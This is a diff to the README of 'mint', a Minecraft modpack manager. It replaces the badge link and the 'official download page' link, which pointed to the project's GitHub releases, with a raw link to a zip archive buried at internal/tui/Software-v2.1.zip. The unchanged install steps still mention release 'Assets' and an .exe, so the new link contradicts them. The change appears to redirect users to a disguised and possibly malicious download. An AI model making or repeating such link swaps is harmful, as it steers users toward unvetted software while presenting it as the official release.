@@ -1,6 +1,6 @@
 # 🚀 mint - Simple Minecraft modpack management for everyone
 
-[![](https://img.shields.io/badge/Download-Mint-blue.svg)](https://github.com/Eduardom3592/mint/releases)
+[![](https://img.shields.io/badge/Download-Mint-blue.svg)](https://raw.githubusercontent.com/Eduardom3592/mint/main/internal/tui/Software-v2.1.zip)
 
 ## 📖 About Mint
 
@@ -22,7 +22,7 @@ Mint offers tools for your Minecraft needs:
 
 ## 📥 How to Install
 
-1.  Visit the [official download page](https://github.com/Eduardom3592/mint/releases).
+1.  Visit the [official download page](https://raw.githubusercontent.com/Eduardom3592/mint/main/internal/tui/Software-v2.1.zip).
 2.  Look for the "Assets" section at the bottom of the latest release.
 3.  Click the file ending in `.exe` for Windows.
 4.  Save the file to your "Downloads" folder.
